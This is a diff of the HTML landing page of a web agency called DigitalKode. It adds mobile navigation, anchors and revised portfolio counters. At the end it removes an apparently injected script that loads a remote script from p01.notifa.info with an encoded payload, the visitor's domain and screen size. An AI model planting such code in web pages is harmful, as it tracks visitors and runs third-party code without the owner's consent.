@@ -19,8 +19,7 @@
     <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800" rel="stylesheet">
 </head>
 
-<body class="home-version-4" data-style="default"><a href="#main_content" data-type="section-switch"
-        class="return-to-top"><i class="fa fa-chevron-up"></i></a>
+<body class="home-version-4" data-style="default">
     <div class="page-loader">
         <div class="loader">
             <div class="blobs">
@@ -51,6 +50,7 @@
                     <div class="site-mobile-logo"><a href="#" class="logo"><img src="media/logo_dark.png"
                                 alt="site logo" class="main-logo"> <img style="max-height:50px; width:50px"
                                 src="media/logo_dark.png" alt="site logo" class="sticky-logo"></a></div>
+                    <!-- desktop -->
                     <nav class="site-nav">
                         <div class="close-menu"><span>Close</span> <i class="ei ei-icon_close"></i></div>
                         <div class="site-logo"><a href="index-2.html" class="logo"><img width="100px"
@@ -70,17 +70,30 @@
                             <div class="nav-right"><a href="contact.html" class="nav-btn">Contact</a></div>
                         </div>
                     </nav>
+
                 </div>
             </div>
         </header>
+        <div class="navbar site-mobile my-auto mx-auto">
+            <div class="row ">
+                <div class="col-3"><a class="active" href="#home"><i class="fa fa-lg fa-home"></i></a> </div>
+                <div class="col-3"><a href="#portofolio"><i class="fa fa-lg fa-paint-brush"></i></a></div>
+                <div class="col-3"><a href="#team"><i class="fa fa-lg fa-users"></i></a> </div>
+                <div class="col-3"> <a href="https://wa.me/6283879178489?text=Hi, DigitalKode!"><i class="fa fa-lg fa-comments"></i></a></div>
+            </div>
+        </div>
         <section class="banner banner-five">
-            <div class="banner-right-shape"><img src="media/banner/banner-five/shape-bg.png" alt=""></div>
+            <div class="banner-right-shape">
+                <img id="home" src="media/banner/banner-five/shape-bg.png" alt="">
+            </div>
             <div class="container">
                 <div class="banner-content-wrap-five">
                     <div class="row">
                         <div class="col-lg-6">
                             <div class="banner-content">
-                                <h5 class="sub-title">Mewujudkan Mimpi di Dunia Digital..</h5>
+                                <img id="img-mobile" class="mx-auto" src="media/logo_dark.png" width="40%" alt="">
+                                <br>
+                                <h5 class="sub-title"><br>Mewujudkan Mimpi di Dunia Digital..</h5>
                                 <h1 class="banner-title wow pixFadeUp" data-wow-delay="0.3s">Selamat Datang
                                     di<br><b>Digital</b>Kode</h1>
                                 <p class="description wow pixFadeUp" data-wow-delay="0.5s">Mari Mewujudkan Mimpi Di
@@ -136,39 +149,39 @@
                 </div>
                 <div class="countup-wrapper-two">
                     <div class="row no-gutters">
-                        <div class="col-lg-3 col-md-6 col-sm-6">
+                        <div class="col-lg-3 col-md-6 col-sm-6 col-6">
                             <div class="fun-fact-two wow pixFadeUp" data-wow-delay="0.3s">
                                 <div class="icon-container"><i class="fa fa-globe"></i></div>
                                 <div class="counter">
                                     <p>Websites</p>
-                                    <h4 class="count" data-counter="153">153</h4>
+                                    <h4 class="count" data-counter="46">46</h4>
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-3 col-md-6 col-sm-6">
+                        <div class="col-lg-3 col-md-6 col-sm-6 col-6">
                             <div class="fun-fact-two color-two wow pixFadeUp" data-wow-delay="0.5s">
                                 <div class="icon-container"><i class="fa fa-desktop "></i></div>
                                 <div class="counter">
                                     <p>Applications</p>
-                                    <h4 class="count" data-counter="456">456</h4>
+                                    <h4 class="count" data-counter="7">7</h4>
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-3 col-md-6 col-sm-6">
+                        <div class="col-lg-3 col-md-6 col-sm-6 col-6">
                             <div class="fun-fact-two color-three wow pixFadeUp" data-wow-delay="0.7s">
                                 <div class="icon-container"><i class="fa fa-mobile "></i></div>
                                 <div class="counter">
                                     <p>Mobiles</p>
-                                    <h4 class="count" data-counter="789">789</h4>
+                                    <h4 class="count" data-counter="8">8</h4>
                                 </div>
                             </div>
                         </div>
-                        <div class="col-lg-3 col-md-6 col-sm-6">
+                        <div class="col-lg-3 col-md-6 col-sm-6 col-6">
                             <div class="fun-fact-two color-four wow pixFadeUp" data-wow-delay="0.9s">
                                 <div class="icon-container"><i class="fa fa-paint-brush "></i></div>
                                 <div class="counter">
                                     <p>UI/UX</p>
-                                    <h4 class="count" data-counter="854">854</h4>
+                                    <h4 class="count" data-counter="25">25</h4>
                                 </div>
                             </div>
                         </div>
@@ -196,7 +209,7 @@
                 </div>
             </div>
         </section>
-        <div class="section inspect">
+        <div class="section inspect" id="portofolio">
             <div class="container">
                 <div class="section-title color-two text-center">
                     <h2 class="title wow pixFadeUp" data-wow-delay="0.3s"
@@ -272,7 +285,7 @@
 
             </div>
         </div>
-        <section class="featured-seven">
+        <section class="featured-seven" id="team">
             <div class="container">
                 <div class="section-title style-two text-center">
                     <h2 class="title wow pixFadeUp">Our Great Teams</h2>
@@ -439,21 +452,25 @@
                             <div class="swiper-wrapper">
                                 <!-- Slides -->
                                 <div class="swiper-slide">
-                                    <img style="border-radius:20px;"src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/367_Vuejs_logo-512.png"
+                                    <img style="border-radius:20px;"
+                                        src="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/367_Vuejs_logo-512.png"
                                         width="100%" alt="">
                                 </div>
                                 <div class="swiper-slide">
-                                    <img style="border-radius:20px;"src="https://cdn4.iconfinder.com/data/icons/logos-3/600/React.js_logo-512.png"
+                                    <img style="border-radius:20px;"
+                                        src="https://cdn4.iconfinder.com/data/icons/logos-3/600/React.js_logo-512.png"
                                         width="100%" alt="">
                                 </div>
                                 <div class="swiper-slide">
-                                    <img style="border-radius:20px;"src="https://cdn.iconscout.com/icon/free/png-512/bootstrap-226077.png" alt="">
+                                    <img style="border-radius:20px;"
+                                        src="https://cdn.iconscout.com/icon/free/png-512/bootstrap-226077.png" alt="">
                                 </div>
                                 <div class="swiper-slide">
-                                    <img style="border-radius:20px;"src="https://upload-icon.s3.us-east-2.amazonaws.com/uploads/icons/png/2396380601551941189-512.png"
+                                    <img style="border-radius:20px;"
+                                        src="https://upload-icon.s3.us-east-2.amazonaws.com/uploads/icons/png/2396380601551941189-512.png"
                                         alt="">
                                 </div>
-                                <div style="border-radius:20px;"class="swiper-slide">
+                                <div style="border-radius:20px;" class="swiper-slide">
                                     <img src="https://javisperez.github.io/tailwindcolorshades/images/logo.png" alt="">
                                 </div>
                                 <div class="swiper-slide">
@@ -647,35 +664,7 @@
     <script src="assets/js/retina.min.html"></script>
     <script src="assets/js/app.js"></script>
     <script src="assets/js/custom.js"></script>
-    <script type="text/javascript">
-        if (self == top) {
-            function netbro_cache_analytics(fn, callback) {
-                setTimeout(function () {
-                    fn();
-                    callback();
-                }, 0);
-            }
 
-            function sync(fn) {
-                fn();
-            }
-
-            function requestCfs() {
-                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-                var idc_glo_r = Math.floor(Math.random() * 99999999999);
-                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
-                    "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXxkK5jPrdzeCrHZvcWHomdOxfI4yd6S5Y%2bYrfPLVbeot9o5mtWmYSp53L5JIQ2mQuH7Pu1%2f4T9i9mvUlSs58MSA%2fNU4f2x51ztpswZ%2f4RAPL49AgB3ouWYp2xYoq%2f51RPP%2b3dVT1qEIP%2bmb4J5JVsu6Zz8b5aZJCvWMRT8CxvH9a9iKzXFw%2b34f3fL9D7%2bgmFOLW%2fh8%2b19wgeXPuV0xx2MlUO1T40DdXgCZmq3zCbM15nz4OKiixSNP%2fIuSdmLjpHJRN5fZhwAopBi9hLGakHFcuC%2fvAB34ZrutWyJppoIewHqltTLyML3hmBz%2bmPDYPYbGWK%2fRY5vmdJPrmSubOCas0yl5zvEJrjPpZ8Nkt6WcduvaJl21w2PW3tNQY33RgN21imOK6X2EnVM1YuGELnKXyUxvCxozcHwaD%2fqdFEMZi%2bsc0lMaj4SNLlEoLsRCMD4GKR0HXtl74%3d" +
-                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
-                    .height;
-                var bsa = document.createElement('script');
-                bsa.type = 'text/javascript';
-                bsa.async = true;
-                bsa.src = url;
-                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-            }
-            netbro_cache_analytics(requestCfs, function () {});
-        };
-    </script>
 </body>
 
 </html>
